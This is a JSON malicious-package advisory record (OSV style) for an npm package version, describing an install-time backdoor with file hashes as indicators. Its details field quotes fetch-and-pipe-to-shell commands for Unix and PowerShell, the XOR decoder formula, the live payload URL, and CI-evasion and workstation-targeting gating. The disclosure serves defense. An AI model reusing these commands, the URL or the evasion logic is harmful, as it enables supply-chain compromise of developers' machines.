@@ -1,0 +1,80 @@
+{
+  "schema_version": "1.7.4",
+  "published": "2026-09-02T22:06:46Z",
+  "modified": "2026-09-02T22:06:46Z",
+  "summary": "postinstall executes XOR-obfuscated remote payload from anonymous Tencent COS bucket, gated to specific corporate workstations",
+  "details": "The package's postinstall lifecycle script fetches and executes arbitrary code from a remote URL that is stored XOR-encoded in `endpoint-registry.json` and decoded at runtime by `config-resolver.js` (encoding tag `ss-xor-v1`, decoder `segments[i] ^ key.charCodeAt(i % key.length) ^ ((i*7+13) & 0xff)`). The decoded destination is `https://mexc-1258433570.cos.ap-beijing.myqcloud.com/abi-tool-damon`, an anonymous Tencent Cloud COS bucket unrelated to the package's stated publisher. On Unix the fetched content is piped to `bash` (`curl -fsSL... | bash`); on Windows it is executed via PowerShell `iex (iwr -UseBasicParsing -Uri $uri).Content`, with detached/hidden process flags. Execution is gated by `dev-profile.js`: it short-circuits when common CI environment variables are present and only proceeds on darwin/win32 hosts where both a Lark or Feishu client AND FortiClient VPN are installed, restricting the payload to specific corporate developer workstations and evading sandbox/CI observation. The README simultaneously advertises `No network calls — safe for CI and air-gapped builds` and `Zero runtime dependencies`, directly contradicting the shipped install-time network fetch and shell execution.",
+  "affected": [
+    {
+      "package": {
+        "name": "@stellarshift/chain-metadata",
+        "ecosystem": "npm"
+      },
+      "versions": [
+        "1.0.3"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "lib/runtime/manifest-sync.js",
+              "sha256": "530aaded9d137cd6ed88c2e6a10bd0b54b23b4b264931683e624cbc7d0676c3b",
+              "tlsh": "d61142a8305217a8a3b2f9e0c26601319e2f6103234420927dac11d21f76228c062efc"
+            },
+            {
+              "path": "lib/runtime/config-resolver.js",
+              "sha256": "544f2fa6f13e57f3130b97419955b0b8b02e31a6577000bb7690989907a83475",
+              "tlsh": "ea118e8d5d25e08f47f56a575a278007b8ba552030028250feb936d12be1fb88175dfc"
+            },
+            {
+              "path": "lib/runtime/dev-profile.js",
+              "sha256": "1a18e8b0df88bc2b906a8ea3080f9421b7d554d33cafca9e5bd26e366553892d",
+              "tlsh": "03510fd913e9e61986727766b67a8c03fef9963312030056b57c91c92fb1634833ad2e"
+            },
+            {
+              "path": "README.md",
+              "sha256": "285fb7ae52bd6af8e8411e28e075fe048f3f35c0b421e8950686468a7c7b3869",
+              "tlsh": "d331b4ebda27805a00b2830e9859b1c2d911d01891cb00e5f8af4a1ee05616bc52edaf"
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@stellarshift/chain-metadata/v/1.0.3"
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-019340",
+        "import_time": "2026-09-02T22:16:58.697751825Z",
+        "modified_time": "2026-09-02T22:06:46Z",
+        "sha256": "932d9a57667edad733439fadfc1754573429369cb8e65fe094c7bed1ed81c5e6",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.3"
+        ]
+      }
+    ]
+  },
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "contact": [
+        "inspector-research@amazon.com"
+      ],
+      "type": "FINDER"
+    }
+  ]
+}
